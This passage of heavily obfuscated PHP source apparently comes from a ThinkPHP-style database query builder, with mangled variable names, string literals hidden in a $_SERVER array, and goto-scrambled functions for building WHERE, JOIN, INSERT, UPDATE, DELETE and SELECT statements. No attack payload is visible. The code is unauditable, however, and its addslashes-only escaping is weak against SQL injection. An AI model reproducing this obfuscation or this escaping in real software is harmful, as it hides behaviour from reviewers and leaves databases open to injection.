strtoupper($a°ËªäÚî[$cØõÕ¨Çˆª[904]]) : $cØõÕ¨Çˆª[33]; if (in_array($FóÇŞÜ§™à, array($cØõÕ¨Çˆª[905], $cØõÕ¨Çˆª[906], $cØõÕ¨Çˆª[907]))) { $FóÇŞÜ§™à = $cØõÕ¨Çˆª[50] . $FóÇŞÜ§™à . $cØõÕ¨Çˆª[50]; unset($a°ËªäÚî[$cØõÕ¨Çˆª[904]]); } else { $FóÇŞÜ§™à = $cØõÕ¨Çˆª[908]; } foreach ($a°ËªäÚî as $C§³™§ˆˆ => $FÕ‹¦¶»È) { $e§î‚ó›ğÕ .= $cØõÕ¨Çˆª[261]; if (is_numeric($C§³™§ˆˆ)) { $C§³™§ˆˆ = $cØõÕ¨Çˆª[909]; } if (0 === strpos($C§³™§ˆˆ, $cØõÕ¨Çˆª[70])) { $e§î‚ó›ğÕ .= $this->parseThinkWhere($C§³™§ˆˆ, $FÕ‹¦¶»È); } else { if (!preg_match($cØõÕ¨Çˆª[910], trim($C§³™§ˆˆ))) { think_exception(think_lang($cØõÕ¨Çˆª[911]) . $cØõÕ¨Çˆª[4] . $C§³™§ˆˆ); } $dù‹è§ö˜ç = is_array($FÕ‹¦¶»È) && isset($FÕ‹¦¶»È[$cØõÕ¨Çˆª[912]]); $C§³™§ˆˆ = trim($C§³™§ˆˆ); if (strpos($C§³™§ˆˆ, $cØõÕ¨Çˆª[267])) { $CéÄ·îËİä = explode($cØõÕ¨Çˆª[267], $C§³™§ˆˆ); $AÕ¿à°Ûéƒ = array(); foreach ($CéÄ·îËİä as $c¤ĞÃçŞ•õ => $aäì¯ÂÏ£ö) { $CÌÁà³¤ø§ = $dù‹è§ö˜ç ? $FÕ‹¦¶»È[$c¤ĞÃçŞ•õ] : $FÕ‹¦¶»È; $AÕ¿à°Ûéƒ[] = $cØõÕ¨Çˆª[244] . $this->parseWhereItem($this->parseKey($aäì¯ÂÏ£ö), $CÌÁà³¤ø§) . $cØõÕ¨Çˆª[807]; } $e§î‚ó›ğÕ .= implode($cØõÕ¨Çˆª[913], $AÕ¿à°Ûéƒ); } elseif (strpos($C§³™§ˆˆ, $cØõÕ¨Çˆª[268])) { $CéÄ·îËİä = explode($cØõÕ¨Çˆª[268], $C§³™§ˆˆ); $AÕ¿à°Ûéƒ = array(); foreach ($CéÄ·îËİä as $c¤ĞÃçŞ•õ => $aäì¯ÂÏ£ö) { $CÌÁà³¤ø§ = $dù‹è§ö˜ç ? $FÕ‹¦¶»È[$c¤ĞÃçŞ•õ] : $FÕ‹¦¶»È; $AÕ¿à°Ûéƒ[] = $cØõÕ¨Çˆª[244] . $this->parseWhereItem($this->parseKey($aäì¯ÂÏ£ö), $CÌÁà³¤ø§) . $cØõÕ¨Çˆª[807]; } $e§î‚ó›ğÕ .= implode($cØõÕ¨Çˆª[908], $AÕ¿à°Ûéƒ); } else { $e§î‚ó›ğÕ .= $this->parseWhereItem($this->parseKey($C§³™§ˆˆ), $FÕ‹¦¶»È); } } $e§î‚ó›ğÕ .= $cØõÕ¨Çˆª[262] . $FóÇŞÜ§™à; } $e§î‚ó›ğÕ = substr($e§î‚ó›ğÕ, 0, -strlen($FóÇŞÜ§™à)); } return empty($e§î‚ó›ğÕ) ? $cØõÕ¨Çˆª[33] : $cØõÕ¨Çˆª[914] . $e§î‚ó›ğÕ; } protected function parseWhereItem($Céöèí†Ï©, $a‰±–êÊÂ’) { $E˜¦Øåäò‡ =& $_SERVER[»„]; $F‘ÀªÉœ®¶ = $E˜¦Øåäò‡[33]; if (is_array($a‰±–êÊÂ’)) { if (is_string($a‰±–êÊÂ’[0])) { $E‹Íˆ²¿Ç = strtolower($a‰±–êÊÂ’[0]); if (in_array($a‰±–êÊÂ’[0], array($E˜¦Øåäò‡[897], $E˜¦Øåäò‡[915], $E˜¦Øåäò‡[916], $E˜¦Øåäò‡[917], $E˜¦Øåäò‡[918], $E˜¦Øåäò‡[919]))) { $F‘ÀªÉœ®¶ .= $Céöèí†Ï© . $E˜¦Øåäò‡[50] . $a‰±–êÊÂ’[0] . $E˜¦Øåäò‡[50] . $this->parseValue($a‰±–êÊÂ’[1]); } elseif (preg_match($E˜¦Øåäò‡[920], $a‰±–êÊÂ’[0])) { $F‘ÀªÉœ®¶ .= $Céöèí†Ï© . $E˜¦Øåäò‡[50] . $this->exp[$E‹Íˆ²¿Ç] . $E˜¦Øåäò‡[50] . $this->parseValue($a‰±–êÊÂ’[1]); } elseif (preg_match($E˜¦Øåäò‡[921], $a‰±–êÊÂ’[0])) { if (is_array($a‰±–êÊÂ’[1])) { $fˆÖô±È†™ = isset($a‰±–êÊÂ’[2]) ? strtoupper($a‰±–êÊÂ’[2]) : $E˜¦Øåäò‡[906]; if (in_array($fˆÖô±È†™, array($E˜¦Øåäò‡[905], $E˜¦Øåäò‡[906], $E˜¦Øåäò‡[907]))) { $d†„áƒÉƒ÷ = array(); foreach ($a‰±–êÊÂ’[1] as $A˜°Ö¼È) { $d†„áƒÉƒ÷[] = $Céöèí†Ï© . $E˜¦Øåäò‡[50] . $this->exp[$E‹Íˆ²¿Ç] . $E˜¦Øåäò‡[50] . $this->parseValue($A˜°Ö¼È); } $F‘ÀªÉœ®¶ .= $E˜¦Øåäò‡[244] . implode($E˜¦Øåäò‡[50] . $fˆÖô±È†™ . $E˜¦Øåäò‡[50], $d†„áƒÉƒ÷) . $E˜¦Øåäò‡[807]; } } else { $F‘ÀªÉœ®¶ .= $Céöèí†Ï© . $E˜¦Øåäò‡[50] . $this->exp[$E‹Íˆ²¿Ç] . $E˜¦Øåäò‡[50] . $this->parseValue($a‰±–êÊÂ’[1]); } } elseif ($E˜¦Øåäò‡[281] == $E‹Íˆ²¿Ç) { $F‘ÀªÉœ®¶ .= $E˜¦Øåäò‡[805] . $Céöèí†Ï© . $E˜¦Øåäò‡[50] . $a‰±–êÊÂ’[1] . $E˜¦Øåäò‡[922]; } elseif (preg_match($E˜¦Øåäò‡[923], $a‰±–êÊÂ’[0])) { if (isset($a‰±–êÊÂ’[2]) && $E˜¦Øåäò‡[281] == $a‰±–êÊÂ’[2]) { $F‘ÀªÉœ®¶ .= $Céöèí†Ï© . $E˜¦Øåäò‡[50] . $this->exp[$E‹Íˆ²¿Ç] . $E˜¦Øåäò‡[50] . $a‰±–êÊÂ’[1]; } else { if (is_string($a‰±–êÊÂ’[1])) { $a‰±–êÊÂ’[1] = explode($E˜¦Øåäò‡[47], $a‰±–êÊÂ’[1]); } $B³‘è™ËŒ = implode($E˜¦Øåäò‡[47], $this->parseValue($a‰±–êÊÂ’[1])); $F‘ÀªÉœ®¶ .= $Céöèí†Ï© . $E˜¦Øåäò‡[50] . $this->exp[$E‹Íˆ²¿Ç] . $E˜¦Øåäò‡[805] . $B³‘è™ËŒ . $E˜¦Øåäò‡[807]; } } elseif (preg_match($E˜¦Øåäò‡[924], $a‰±–êÊÂ’[0])) { $D±Œ¯ÔÒš = is_string($a‰±–êÊÂ’[1]) ? explode($E˜¦Øåäò‡[47], $a‰±–êÊÂ’[1]) : $a‰±–êÊÂ’[1]; $F‘ÀªÉœ®¶ .= $E˜¦Øåäò‡[805] . $Céöèí†Ï© . $E˜¦Øåäò‡[50] . $this->exp[$E‹Íˆ²¿Ç] . $E˜¦Øåäò‡[50] . $this->parseValue($D±Œ¯ÔÒš[0]) . $E˜¦Øåäò‡[908] . $this->parseValue($D±Œ¯ÔÒš[1]) . $E˜¦Øåäò‡[262]; } else { think_exception(think_lang($E˜¦Øåäò‡[911]) . $E˜¦Øåäò‡[4] . $a‰±–êÊÂ’[0]); } } else { $cî³¢ùÏ– = count($a‰±–êÊÂ’); $C…Å—Ÿ²× = isset($a‰±–êÊÂ’[$cî³¢ùÏ– - 1]) ? strtoupper($a‰±–êÊÂ’[$cî³¢ùÏ– - 1]) : $E˜¦Øåäò‡[33]; if (in_array($C…Å—Ÿ²×, array($E˜¦Øåäò‡[905], $E˜¦Øåäò‡[906], $E˜¦Øåäò‡[907]))) { $cî³¢ùÏ– = $cî³¢ùÏ– - 1; } else { $C…Å—Ÿ²× = $E˜¦Øåäò‡[905]; } for ($d×æÎ¹® = 0; $d×æÎ¹® < $cî³¢ùÏ–; $d×æÎ¹®++) { $D±Œ¯ÔÒš = is_array($a‰±–êÊÂ’[$d×æÎ¹®]) ? $a‰±–êÊÂ’[$d×æÎ¹®][1] : $a‰±–êÊÂ’[$d×æÎ¹®]; if ($E˜¦Øåäò‡[281] == strtolower($a‰±–êÊÂ’[$d×æÎ¹®][0])) { $F‘ÀªÉœ®¶ .= $E˜¦Øåäò‡[244] . $Céöèí†Ï© . $E˜¦Øåäò‡[50] . $D±Œ¯ÔÒš . $E˜¦Øåäò‡[922] . $C…Å—Ÿ²× . $E˜¦Øåäò‡[50]; } else { $BĞİÓÌàˆ¼ = is_array($a‰±–êÊÂ’[$d×æÎ¹®]) ? $this->exp[strtolower($a‰±–êÊÂ’[$d×æÎ¹®][0])] : $E˜¦Øåäò‡[897]; if (!$BĞİÓÌàˆ¼ && is_array($a‰±–êÊÂ’[$d×æÎ¹®]) && in_array($a‰±–êÊÂ’[$d×æÎ¹®][0], array($E˜¦Øåäò‡[897], $E˜¦Øåäò‡[915], $E˜¦Øåäò‡[916], $E˜¦Øåäò‡[917], $E˜¦Øåäò‡[918], $E˜¦Øåäò‡[919]))) { $BĞİÓÌàˆ¼ = $a‰±–êÊÂ’[$d×æÎ¹®][0]; } $F‘ÀªÉœ®¶ .= $E˜¦Øåäò‡[244] . $Céöèí†Ï© . $E˜¦Øåäò‡[50] . $BĞİÓÌàˆ¼ . $E˜¦Øåäò‡[50] . $this->parseValue($D±Œ¯ÔÒš) . $E˜¦Øåäò‡[922] . $C…Å—Ÿ²× . $E˜¦Øåäò‡[50]; } } $F‘ÀªÉœ®¶ = substr($F‘ÀªÉœ®¶, 0, -4); } } else { $F‘ÀªÉœ®¶ .= $Céöèí†Ï© . $E˜¦Øåäò‡[925] . $this->parseValue($a‰±–êÊÂ’); } return $F‘ÀªÉœ®¶; } protected function parseThinkWhere($BÍåÒÓçÉÅ, $fó©›‹ˆ´È) { $aôÉïÀÑñÏ =& $_SERVER[»„]; $DÜ×¾˜ïï¿ = $aôÉïÀÑñÏ[33]; switch ($BÍåÒÓçÉÅ) { case $aôÉïÀÑñÏ[335]: $DÜ×¾˜ïï¿ = $fó©›‹ˆ´È; break; case $aôÉïÀÑñÏ[909]: $DÜ×¾˜ïï¿ = is_string($fó©›‹ˆ´È) ? $fó©›‹ˆ´È : substr($this->parseWhere($fó©›‹ˆ´È), 6); break; case $aôÉïÀÑñÏ[926]: parse_str($fó©›‹ˆ´È, $EšÊ©¯íá†); if (isset($EšÊ©¯íá†[$aôÉïÀÑñÏ[904]])) { $E¨¤Ú¶µºŒ = $aôÉïÀÑñÏ[50] . strtoupper($EšÊ©¯íá†[$aôÉïÀÑñÏ[904]]) . $aôÉïÀÑñÏ[50]; unset($EšÊ©¯íá†[$aôÉïÀÑñÏ[904]]); } else { $E¨¤Ú¶µºŒ = $aôÉïÀÑñÏ[908]; } $E½ÔÆÔëßÛ = array(); foreach ($EšÊ©¯íá† as $fÕÁ»‹öù => $CˆÇ”Ë‘Ô) { $E½ÔÆÔëßÛ[] = $this->parseKey($fÕÁ»‹öù) . $aôÉïÀÑñÏ[925] . $this->parseValue($CˆÇ”Ë‘Ô); } $DÜ×¾˜ïï¿ = implode($E¨¤Ú¶µºŒ, $E½ÔÆÔëßÛ); break; } return $DÜ×¾˜ïï¿; } protected function parseLimit($F†ÎŠòÁå·) { $c·¾”×Ä´¦ =& $_SERVER[»„]; return !empty($F†ÎŠòÁå·) ? $c·¾”×Ä´¦[48] . $F†ÎŠòÁå· . $c·¾”×Ä´¦[50] : $c·¾”×Ä´¦[33]; } protected function parseJoin($DÚ‘á¢ Ä) { $Eó›èÛŒ›Ö =& $_SERVER[»„]; $f™“¬Ç‹¿Ä = $Eó›èÛŒ›Ö[33]; if (!empty($DÚ‘á¢ Ä)) { if (is_array($DÚ‘á¢ Ä)) { foreach ($DÚ‘á¢ Ä as $A×Â·àÉ™ò => $e«™ÖÌğà˜) { if (!1 !== stripos($e«™ÖÌğà˜, $Eó›èÛŒ›Ö[927])) { $f™“¬Ç‹¿Ä .= $Eó›èÛŒ›Ö[50] . $e«™ÖÌğà˜; } else { $f™“¬Ç‹¿Ä .= $Eó›èÛŒ›Ö[928] . $e«™ÖÌğà˜; } } } else { $f™“¬Ç‹¿Ä .= $Eó›èÛŒ›Ö[928] . $DÚ‘á¢ Ä; } } $f™“¬Ç‹¿Ä = preg_replace($Eó›èÛŒ›Ö[929], think_config($Eó›èÛŒ›Ö[832]) . $Eó›èÛŒ›Ö[930], $f™“¬Ç‹¿Ä); return $f™“¬Ç‹¿Ä; } protected function parseOrder($fË§›ÉŸ¤İ) { $CÈğ³á®ì =& $_SERVER[»„]; if (is_array($fË§›ÉŸ¤İ)) { $E§æ±å‰Ú = array(); foreach ($fË§›ÉŸ¤İ as $A³‹¦ì™‚ => $a’ÛËò’Ñ) { if (is_numeric($A³‹¦ì™‚)) { $E§æ±å‰Ú[] = $this->parseKey($a’ÛËò’Ñ); } else { $a’ÛËò’Ñ = in_array(strtoupper(trim($a’ÛËò’Ñ)), array($CÈğ³á®ì[931], $CÈğ³á®ì[932])) ? $CÈğ³á®ì[50] . $a’ÛËò’Ñ : $CÈğ³á®ì[33]; if (preg_match($CÈğ³á®ì[933], $A³‹¦ì™‚)) { $E§æ±å‰Ú[] = $this->parseKey($A³‹¦ì™‚) . $a’ÛËò’Ñ; } else { think_exception($CÈğ³á®ì[934] . $A³‹¦ì™‚); } } } $fË§›ÉŸ¤İ = implode($CÈğ³á®ì[47], $E§æ±å‰Ú); } return !empty($fË§›ÉŸ¤İ) ? $CÈğ³á®ì[935] . $fË§›ÉŸ¤İ : $CÈğ³á®ì[33]; } protected function parseGroup($FŠ³„à ¦Ú) { $EÛÊ¢š‰Õ =& $_SERVER[»„]; return !empty($FŠ³„à ¦Ú) ? $EÛÊ¢š‰Õ[936] . $FŠ³„à ¦Ú : $EÛÊ¢š‰Õ[33]; } protected function parseHaving($B©Ü •±Š–) { $AÍ“Ü¦¦Ú¬ =& $_SERVER[»„]; return !empty($B©Ü •±Š–) ? $AÍ“Ü¦¦Ú¬[937] . $B©Ü •±Š– : $AÍ“Ü¦¦Ú¬[33]; } protected function parseComment($F¦ÁŠÇ›Öš) { $FÑçé¢Ç =& $_SERVER[»„]; return !empty($F¦ÁŠÇ›Öš) ? $FÑçé¢Ç[938] . $F¦ÁŠÇ›Öš . $FÑçé¢Ç[939] : $FÑçé¢Ç[33]; } protected function parseDistinct($C…ÅùÓß¤–) { $dáˆÓíàó¹ =& $_SERVER[»„]; return !empty($C…ÅùÓß¤–) ? $dáˆÓíàó¹[940] : $dáˆÓíàó¹[33]; } protected function parseUnion($D×äç¢ŞÚã) { $Aªƒ¡ÊÓÇâ =& $_SERVER[»„]; if (empty($D×äç¢ŞÚã)) { return $Aªƒ¡ÊÓÇâ[33]; } if (isset($D×äç¢ŞÚã[$Aªƒ¡ÊÓÇâ[332]])) { $e¾”‹ºÛæ¼ = $Aªƒ¡ÊÓÇâ[941]; unset($D×äç¢ŞÚã[$Aªƒ¡ÊÓÇâ[332]]); } else { $e¾”‹ºÛæ¼ = $Aªƒ¡ÊÓÇâ[942]; } foreach ($D×äç¢ŞÚã as $BæãÔ¶Šª) { $EùÅËöœó[] = $e¾”‹ºÛæ¼ . (is_array($BæãÔ¶Šª) ? $this->buildSelectSql($BæãÔ¶Šª) : $BæãÔ¶Šª); } return implode($Aªƒ¡ÊÓÇâ[50], $EùÅËöœó); } public function insert($Côø‰±•®¿, $c¦ß÷ğÔ»ø = array(), $dä¦ä¥¸“ = false) { goto fÖ¦´ˆ±¥ê; fÖ¦´ˆ±¥ê: $d×µğ›“Ôª =& $_SERVER[»„]; $d¼Á¢‚Ú„ = $eêáÁÈè± = array(); $this->model = $c¦ß÷ğÔ»ø[$d×µğ›“Ôª[265]]; goto EÀ¾¼­‘âï; EÀ¾¼­‘âï: foreach ($Côø‰±•®¿ as $DŞŸ±ÈâÛ => $fÅ›ƒØ®××) { if (is_array($fÅ›ƒØ®××) && $d×µğ›“Ôª[281] == $fÅ›ƒØ®××[0]) { $eêáÁÈè±[] = $this->parseKey($DŞŸ±ÈâÛ); $d¼Á¢‚Ú„[] = $fÅ›ƒØ®××[1]; } elseif (is_scalar($fÅ›ƒØ®××) || is_null($fÅ›ƒØ®××)) { $eêáÁÈè±[] = $this->parseKey($DŞŸ±ÈâÛ); $d¼Á¢‚Ú„[] = $this->parseValue($fÅ›ƒØ®××); } } $CæäŒÅÄ” = ($dä¦ä¥¸“ ? $d×µğ›“Ôª[809] : $d×µğ›“Ôª[810]) . $d×µğ›“Ôª[811] . $this->parseTable($c¦ß÷ğÔ»ø[$d×µğ›“Ôª[263]]) . $d×µğ›“Ôª[805] . implode($d×µğ›“Ôª[47], $eêáÁÈè±) . $d×µğ›“Ôª[806] . implode($d×µğ›“Ôª[47], $d¼Á¢‚Ú„) . $d×µğ›“Ôª[807]; $CæäŒÅÄ” .= $this->parseLock(isset($c¦ß÷ğÔ»ø[$d×µğ›“Ôª[766]]) ? $c¦ß÷ğÔ»ø[$d×µğ›“Ôª[766]] : !1); goto FçŸŞé“ø„; FçŸŞé“ø„: $CæäŒÅÄ” .= $this->parseComment(!empty($c¦ß÷ğÔ»ø[$d×µğ›“Ôª[337]]) ? $c¦ß÷ğÔ»ø[$d×µğ›“Ôª[337]] : $d×µğ›“Ôª[33]); return $this->execute($CæäŒÅÄ”, $this->parseBind(!empty($c¦ß÷ğÔ»ø[$d×µğ›“Ôª[269]]) ? $c¦ß÷ğÔ»ø[$d×µğ›“Ôª[269]] : array())); goto aéêß½ÌÍí; aéêß½ÌÍí: } public function selectInsert($eâ­ªÃ‡™ô, $c¯ˆ½ÛÅ, $eŒØ‘«ƒí¼ = array()) { goto dÏ‘ƒùÏÁ˜; dÏ‘ƒùÏÁ˜: $f›æˆˆä– =& $_SERVER[»„]; $this->model = $eŒØ‘«ƒí¼[$f›æˆˆä–[265]]; if (is_string($eâ­ªÃ‡™ô)) { $eâ­ªÃ‡™ô = explode($f›æˆˆä–[47], $eâ­ªÃ‡™ô); } goto Câ‚ïÇÚˆÙ; Cƒ•´®éç: return $this->execute($BÌ¹î‰§ÅÃ, $this->parseBind(!empty($eŒØ‘«ƒí¼[$f›æˆˆä–[269]]) ? $eŒØ‘«ƒí¼[$f›æˆˆä–[269]] : array())); goto DçµùÅÒ„; Câ‚ïÇÚˆÙ: array_walk($eâ­ªÃ‡™ô, array($this, $f›æˆˆä–[808])); $BÌ¹î‰§ÅÃ = $f›æˆˆä–[943] . $this->parseTable($c¯ˆ½ÛÅ) . $f›æˆˆä–[805] . implode($f›æˆˆä–[47], $eâ­ªÃ‡™ô) . $f›æˆˆä–[922]; $BÌ¹î‰§ÅÃ .= $this->buildSelectSql($eŒØ‘«ƒí¼); goto Cƒ•´®éç; DçµùÅÒ„: } public function update($AöŒâìöšÇ, $b«§‹‰Š·‹) { $f”Ù™Òï‰ˆ =& $_SERVER[»„]; $this->model = $b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[265]]; $EÜ…–ëôÈ = $f”Ù™Òï‰ˆ[944] . $this->parseTable($b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[263]]) . $this->parseSet($AöŒâìöšÇ) . $this->parseWhere(!empty($b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[259]]) ? $b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[259]] : $f”Ù™Òï‰ˆ[33]) . $this->parseOrder(!empty($b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[346]]) ? $b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[346]] : $f”Ù™Òï‰ˆ[33]) . $this->parseLimit(!empty($b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[276]]) ? $b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[276]] : $f”Ù™Òï‰ˆ[33]) . $this->parseLock(isset($b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[766]]) ? $b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[766]] : !1) . $this->parseComment(!empty($b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[337]]) ? $b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[337]] : $f”Ù™Òï‰ˆ[33]); return $this->execute($EÜ…–ëôÈ, $this->parseBind(!empty($b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[269]]) ? $b«§‹‰Š·‹[$f”Ù™Òï‰ˆ[269]] : array())); } public function delete($fØëÖµÅÑí = array()) { $b¡Ô•¶ÅØ =& $_SERVER[»„]; $this->model = $fØëÖµÅÑí[$b¡Ô•¶ÅØ[265]]; $f½óÖà‹¡Š = $b¡Ô•¶ÅØ[945] . $this->parseTable($fØëÖµÅÑí[$b¡Ô•¶ÅØ[263]]) . $this->parseWhere(!empty($fØëÖµÅÑí[$b¡Ô•¶ÅØ[259]]) ? $fØëÖµÅÑí[$b¡Ô•¶ÅØ[259]] : $b¡Ô•¶ÅØ[33]) . $this->parseOrder(!empty($fØëÖµÅÑí[$b¡Ô•¶ÅØ[346]]) ? $fØëÖµÅÑí[$b¡Ô•¶ÅØ[346]] : $b¡Ô•¶ÅØ[33]) . $this->parseLimit(!empty($fØëÖµÅÑí[$b¡Ô•¶ÅØ[276]]) ? $fØëÖµÅÑí[$b¡Ô•¶ÅØ[276]] : $b¡Ô•¶ÅØ[33]) . $this->parseLock(isset($fØëÖµÅÑí[$b¡Ô•¶ÅØ[766]]) ? $fØëÖµÅÑí[$b¡Ô•¶ÅØ[766]] : !1) . $this->parseComment(!empty($fØëÖµÅÑí[$b¡Ô•¶ÅØ[337]]) ? $fØëÖµÅÑí[$b¡Ô•¶ÅØ[337]] : $b¡Ô•¶ÅØ[33]); return $this->execute($f½óÖà‹¡Š, $this->parseBind(!empty($fØëÖµÅÑí[$b¡Ô•¶ÅØ[269]]) ? $fØëÖµÅÑí[$b¡Ô•¶ÅØ[269]] : array())); } public function select($fãØäŠ…Œ = array()) { goto D¯¿â‰’Ö; D¯¿â‰’Ö: $e©“—á©‡  =& $_SERVER[»„]; $this->model = $fãØäŠ…Œ[$e©“—á©‡ [265]]; $E…˜êÄ·£ = $this->buildSelectSql($fãØäŠ…Œ); goto e±•Îìä; A‚Ô¸›¨¨: if ($eª ÖÏğ¬· && !1 !== $F³³êâÙŠÖ) { think_cache($bŞ×é˜æ‹ä, $F³³êâÙŠÖ, $eª ÖÏğ¬·); } return $F³³êâÙŠÖ; goto D¹ù‚‚ßŠ; e±•Îìä: $eª ÖÏğ¬· = isset($fãØäŠ…Œ[$e©“—á©‡ [333]]) ? $fãØäŠ…Œ[$e©“—á©‡ [333]] : !1; if ($eª ÖÏğ¬·) { $bŞ×é˜æ‹ä = is_string($eª ÖÏğ¬·[$e©“—á©‡ [89]]) ? $eª ÖÏğ¬·[$e©“—á©‡ [89]] : $e©“—á©‡ [946] . md5($E…˜êÄ·£); $FÙ½ø´„ç‹ = think_cache($bŞ×é˜æ‹ä, $e©“—á©‡ [33], $eª ÖÏğ¬·); if (!1 !== $FÙ½ø´„ç‹) { return $FÙ½ø´„ç‹; } } $F³³êâÙŠÖ = $this->query($E…˜êÄ·£, $this->parseBind(!empty($fãØäŠ…Œ[$e©“—á©‡ [269]]) ? $fãØäŠ…Œ[$e©“—á©‡ [269]] : array())); goto A‚Ô¸›¨¨; D¹ù‚‚ßŠ: } public function buildSelectSql($DÓ«“§‰ß¥ = array()) { goto Aî„±©‚”œ; Aî„±©‚”œ: $d©ôğË„Æ† =& $_SERVER[»„]; if (isset($DÓ«“§‰ß¥[$d©ôğË„Æ†[336]])) { if (strpos($DÓ«“§‰ß¥[$d©ôğË„Æ†[336]], $d©ôğË„Æ†[47])) { list($C…ĞëÊÊ›Ï, $bœ˜•ååªİ) = explode($d©ôğË„Æ†[47], $DÓ«“§‰ß¥[$d©ôğË„Æ†[336]]); } else { $C…ĞëÊÊ›Ï = $DÓ«“§‰ß¥[$d©ôğË„Æ†[336]]; } $C…ĞëÊÊ›Ï = $C…ĞëÊÊ›Ï ? $C…ĞëÊÊ›Ï : 1; $bœ˜•ååªİ = isset($bœ˜•ååªİ) ? $bœ˜•ååªİ : (is_numeric($DÓ«“§‰ß¥[$d©ôğË„Æ†[276]]) ? $DÓ«“§‰ß¥[$d©ôğË„Æ†[276]] : 20); $CĞÔÓ£Á˜ = $bœ˜•ååªİ * ((int) $C…ĞëÊÊ›Ï - 1); $DÓ«“§‰ß¥[$d©ôğË„Æ†[276]] = $CĞÔÓ£Á˜ . $d©ôğË„Æ†[47] . $bœ˜•ååªİ; } if (think_config($d©ôğË„Æ†[947])) { $Eøº¹“©Ù± = $d©ôğË„Æ†[948] . md5(serialize($DÓ«“§‰ß¥)); $f§ˆ™·Ì¾‡ = think_cache($Eøº¹“©Ù±); if ($f§ˆ™·Ì¾‡) { return $f§ˆ™·Ì¾‡; } } goto B‘…– °·; B‘…– °·: $e¤ä­Õß” = $this->parseSql($this->selectSql, $DÓ«“§‰ß¥); $e¤ä­Õß” .= $this->parseLock(isset($DÓ«“§‰ß¥[$d©ôğË„Æ†[766]]) ? $DÓ«“§‰ß¥[$d©ôğË„Æ†[766]] : !1); if (isset($Eøº¹“©Ù±)) { think_cache($Eøº¹“©Ù±, $e¤ä­Õß”); } goto dôÒØ •ïÔ; dôÒØ •ïÔ: return $e¤ä­Õß”; goto cÀø›¨¤º; cÀø›¨¤º: } public function parseSql($c¹Ğìƒ†…, $AÑÁ‡‹ÚÖ = array()) { $DÏê¯Â¨°Ç =& $_SERVER[»„]; $c¹Ğìƒ†… = str_replace(array($DÏê¯Â¨°Ç[949], $DÏê¯Â¨°Ç[950], $DÏê¯Â¨°Ç[951], $DÏê¯Â¨°Ç[952], $DÏê¯Â¨°Ç[953], $DÏê¯Â¨°Ç[954], $DÏê¯Â¨°Ç[955], $DÏê¯Â¨°Ç[956], $DÏê¯Â¨°Ç[957], $DÏê¯Â¨°Ç[958], $DÏê¯Â¨°Ç[959]), array($this->parseTable("{$AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[263]]}"), $this->parseDistinct(isset($AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[960]]) ? $AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[960]] : !1), $this->parseField(!empty($AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[257]]) ? $AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[257]] : $DÏê¯Â¨°Ç[172]), $this->parseJoin(!empty($AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[266]]) ? $AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[266]] : $DÏê¯Â¨°Ç[33]), $this->parseWhere(!empty($AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[259]]) ? $AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[259]] : $DÏê¯Â¨°Ç[33]), $this->parseGroup(!empty($AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[961]]) ? $AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[961]] : $DÏê¯Â¨°Ç[33]), $this->parseHaving(!empty($AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[962]]) ? $AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[962]] : $DÏê¯Â¨°Ç[33]), $this->parseOrder(!empty($AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[346]]) ? $AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[346]] : $DÏê¯Â¨°Ç[33]), $this->parseLimit(!empty($AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[276]]) ? $AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[276]] : $DÏê¯Â¨°Ç[33]), $this->parseUnion(!empty($AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[331]]) ? $AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[331]] : $DÏê¯Â¨°Ç[33]), $this->parseComment(!empty($AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[337]]) ? $AÑÁ‡‹ÚÖ[$DÏê¯Â¨°Ç[337]] : $DÏê¯Â¨°Ç[33])), $c¹Ğìƒ†…); return $c¹Ğìƒ†…; } public function getLastSql($BÍÙ•±Ò„ = '') { return $BÍÙ•±Ò„ ? $this->modelSql[$BÍÙ•±Ò„] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($b…‹ØÕ¿ºÊ) { return addslashes($b…‹ØÕ¿ºÊ); } public function setModel($E®ğ¥Ô•Œ) { $this->model = $E®ğ¥Ô•Œ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($dõ‰Œ¤¨, $d ­˜š®îÔ = '') { $this->database = $dõ‰Œ¤¨; $this->type = $d ­˜š®îÔ; } public function model($E†„ÛÀŸ¸“ = '') { return new ModelBase($E†„ÛÀŸ¸“, $_SERVER[»„][33], $this->database); } public function db($DÎß¸ñ«Ö = false) { goto B¦Š ºĞ”á; E×ÂíÙ‹æÃ: if (!$cÏÎñíøœ) { $e´šø‘ÛóÖ->execute("\143\162\145\x61\x74\145\x20\144\141\164\x61\142\141\163\145\x20\x60{$cÒËä„“±}\x60"); } $có¼²â‘†Ì[$Cîİ¢¢–å[230]] = $cÒËä„“±; if ($có¼²â‘†Ì[$Cîİ¢¢–å[878]] == 